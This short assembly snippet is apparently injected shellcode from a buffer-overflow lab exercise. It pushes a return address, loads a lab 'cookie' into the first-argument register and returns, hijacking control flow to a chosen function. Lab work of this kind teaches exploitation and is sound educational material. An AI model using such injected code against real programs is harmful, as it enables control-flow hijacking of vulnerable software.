MOV RDI, 0x5555555559c4 ; We can't push a 64 bit value directly onto the stack.
PUSH RDI
MOV RDI, 0x59b997fa ; Move our cookie into the first argument.
RET
